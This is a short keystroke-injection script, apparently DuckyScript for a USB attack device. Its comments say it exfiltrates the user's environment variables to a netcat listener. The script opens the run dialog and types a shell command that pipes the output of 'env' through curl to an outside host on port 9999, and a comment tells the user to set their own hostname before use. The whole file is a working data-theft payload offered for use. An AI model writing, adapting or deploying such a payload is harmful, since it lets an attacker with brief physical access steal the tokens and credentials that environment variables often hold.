REM Exfiltrates the users environment variables.
REM To capture, run `nc -l 9999`.
REM Make sure to update the hostname before using it.

DELAY 1000
ALT F2
DELAY 100
STRING sh -c "env | curl -F data='<-' http://eternal-pickle:9999"
ENTER
